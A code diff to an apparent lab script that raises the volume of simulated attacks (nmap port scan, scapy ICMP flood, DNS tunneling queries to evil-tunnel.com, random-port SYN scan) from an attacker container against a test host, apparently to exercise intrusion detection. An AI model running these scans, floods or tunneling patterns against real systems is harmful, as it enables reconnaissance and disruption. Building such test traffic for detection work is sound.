@@ -68,12 +68,12 @@ def execute_signature_based_attacks():
     print("🔥 PHASE 1: SIGNATURE-BASED ATTACKS")
     print("=" * 70)
     
-    # Attack 1: nmap Port Scan
+    # Attack 1: nmap Port Scan (INCREASED to 200 ports)
     print("\n[1/5] Port Scan (nmap)")
-    cmd = ['docker', 'exec', 'attacker', 'nmap', '-p', '1-100', '--max-rate', '50', '10.0.0.30']
+    cmd = ['docker', 'exec', 'attacker', 'nmap', '-p', '1-200', '--max-rate', '50', '10.0.0.30']
     result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
     if result.returncode == 0:
-        print("   ✅ Port scan completed (100 ports)")
+        print("   ✅ Port scan completed (200 ports)")
     else:
         print(f"   ⚠️  Port scan executed with warnings")
     
@@ -123,13 +123,13 @@ print("ARP spoofing completed")
     print("   ✅ ARP spoofing completed (MAC changes)")
     time.sleep(1)
     
-    # Attack 4: ICMP Flood
+    # Attack 4: ICMP Flood (INCREASED to 180 packets)
     print("\n[4/5] ICMP Flood Attack")
     icmp_script = """
 from scapy.all import *
 
 victim = "10.0.0.30"
-for i in range(120):
+for i in range(180):
     pkt = IP(dst=victim)/ICMP(type=8, seq=i)
     send(pkt, verbose=False)
 
@@ -143,10 +143,10 @@ print("ICMP flood completed")
                    capture_output=True)
     result = subprocess.run(['docker', 'exec', 'attacker', 'python3', '/tmp/icmp_flood.py'],
                            capture_output=True, text=True, timeout=15)
-    print("   ✅ ICMP flood completed (120 packets)")
+    print("   ✅ ICMP flood completed (180 packets)")
     time.sleep(1)
     
-    # Attack 5: DNS Tunneling Simulation
+    # Attack 5: DNS Tunneling Simulation (INCREASED to 25 queries)
     print("\n[5/5] DNS Tunneling Attack")
     dns_script = """
 from scapy.all import *
@@ -156,7 +156,7 @@ import string
 victim = "10.0.0.30"
 
 # Generate suspicious long DNS queries (tunneling pattern)
-for i in range(15):
+for i in range(25):
     subdomain = ''.join(random.choices(string.hexdigits.lower(), k=32))
     query = f"{subdomain}.evil-tunnel.com"
     pkt = IP(dst=victim)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=query))
@@ -172,7 +172,7 @@ print("DNS tunneling completed")
                    capture_output=True)
     result = subprocess.run(['docker', 'exec', 'attacker', 'python3', '/tmp/dns_tunnel.py'],
                            capture_output=True, text=True, timeout=10)
-    print("   ✅ DNS tunneling completed (15 suspicious queries)")
+    print("   ✅ DNS tunneling completed (25 suspicious queries)")
     time.sleep(1)
 
 
@@ -191,13 +191,13 @@ import time
 attacker = "10.0.0.20"
 victim = "10.0.0.30"
 
-print("\\n[1/3] High Port Entropy Attack (Random Ports)")
+print("\n[1/3] High Port Entropy Attack (Random Ports)")
 ports = list(range(1, 65535))
-random_ports = random.sample(ports, 100)
+random_ports = random.sample(ports, 150)
 for port in random_ports:
     pkt = IP(src=attacker, dst=victim)/TCP(dport=port, flags="S")
     send(pkt, verbose=0)
-print(f"   ✅ Sent SYN packets to 100 random ports (high entropy)")
+print(f"   ✅ Sent SYN packets to 150 random ports (high entropy)")
 
 time.sleep(1)
 
